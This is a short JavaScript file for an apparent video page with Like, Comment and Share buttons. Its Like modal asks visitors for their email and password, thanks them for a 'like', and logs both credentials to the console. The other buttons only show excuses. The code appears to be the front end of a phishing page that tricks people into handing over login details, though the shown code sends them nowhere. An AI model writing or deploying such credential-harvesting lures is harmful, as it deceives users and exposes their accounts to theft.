// Open the Like modal
function openModal() {
    document.getElementById("like-modal").classList.remove("hidden");
}

// Close the Like modal
function closeModal() {
    document.getElementById("like-modal").classList.add("hidden");
}

// Save Like input
function saveInput() {
    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;

    if (!email || !password) {
        alert("Please fill in both email and password.");
        return;
    }

    alert("Thank you! Your like has been recorded.");
    console.log("User Email:", email);
    console.log("User Password:", password);
    closeModal();
}

// Open the Comment modal
function openCommentBox() {
    document.getElementById("comment-box").classList.remove("hidden");
}

// Close the Comment modal
function closeCommentBox() {
    document.getElementById("comment-box").classList.add("hidden");
}

// Save Comment
function saveComment() {
    alert("Poor Internet.");
    closeCommentBox();
}

// Placeholder for Share
function shareVideo() {
    alert("Share feature unavailable at the moment.");
}
